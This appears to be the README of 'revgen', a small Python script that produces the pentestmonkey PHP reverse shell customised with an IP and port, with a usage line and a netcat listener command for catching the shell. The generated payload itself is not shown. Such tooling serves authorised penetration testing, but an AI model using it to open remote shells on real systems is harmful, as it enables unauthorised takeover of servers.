# revgen
A (very) simple php reverse shell payload generator, written in Python. It generates the revshell provided by [pentestmonkey.net](https://pentestmonkey.net/tools/web-shells/php-reverse-shell), automatically customizing it with the given IP and port.

## Usage
revgen does not require additional pip packages. Don't forget to set up a listener on the port you're using!

```py
python3 revgen -i <ip> -p <port> -o <file to be generated>
```

```sh
nc -lvvp <port>
```
